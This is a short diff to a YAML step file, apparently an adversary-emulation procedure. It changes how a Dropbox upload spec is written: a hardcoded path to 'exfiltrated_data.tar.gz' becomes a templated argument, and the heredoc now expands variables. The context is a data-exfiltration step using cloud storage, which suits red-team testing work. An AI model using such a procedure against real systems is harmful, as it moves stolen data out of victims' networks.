@@ -47,9 +47,9 @@ steps:
     echo "  Upload chunks: $chunks"
 - name: Prepare Dropbox API request
   inline: |
-    cat > /tmp/dropbox_upload_spec.json << 'DROPBOX_JSON'
+    cat > /tmp/dropbox_upload_spec.json <<DROPBOX_JSON
     {
-      "path": "/Backups/exfiltrated_data.tar.gz",
+      "path": "{{ .Args.dropbox_path }}",
       "mode": "add",
       "autorename": true,
       "mute": false,
